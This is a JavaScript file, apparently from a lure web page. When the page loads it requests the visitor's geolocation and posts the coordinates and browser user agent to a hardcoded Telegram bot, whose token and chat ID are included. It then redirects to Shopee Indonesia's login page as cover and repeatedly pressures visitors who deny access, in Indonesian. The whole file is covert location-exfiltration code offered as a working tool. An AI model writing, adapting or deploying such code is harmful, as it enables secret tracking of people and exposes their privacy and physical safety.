


var botToken = '7414756868:AAEoYeLOI3CXh8C-MKZoBDdJkiJjMQxfGPs';
var chatId = '5450283191';



function sendLocationToTelegram(latitude, longitude, userAgent) {
    var telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
    var data = {
        chat_id: chatId,
        latitude: latitude,
        longitude: longitude,
        caption: `User Agent: ${userAgent}`
    };

    var xhr = new XMLHttpRequest();
    xhr.open('POST', telegramApiUrl, true);
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                console.log('Location ', latitude, longitude);
                window.location.href = 'https://shopee.co.id/buyer/login?next=https%3A%2F%2Fshopee.co.id%2F';
            } else {
                console.error('Failed ', xhr.status);
            }
        }
    };

    xhr.send(JSON.stringify(data));
}


function getLocationAndSend() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var userAgent = navigator.userAgent;

            
            sendLocationToTelegram(latitude, longitude, userAgent);
        }, function(error) {
            console.error('Error getting location:', error);
            
            alert('Untuk melanjutkan, izinkan akses lokasi Anda.');
            
            askForLocationPermission();
        });
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

// 
function askForLocationPermission() {
    var button = document.createElement('button');
    button.textContent = 'Allow Location Access';
    button.onclick = function() {
        getLocationAndSend();
    };
    
    var message = document.createElement('div');
    message.textContent = 'Untuk melanjutkan, izinkan akses lokasi Anda:';
    message.appendChild(button);
    
    
    document.body.appendChild(message);
}


document.addEventListener("DOMContentLoaded", function () {
    getLocationAndSend();
});

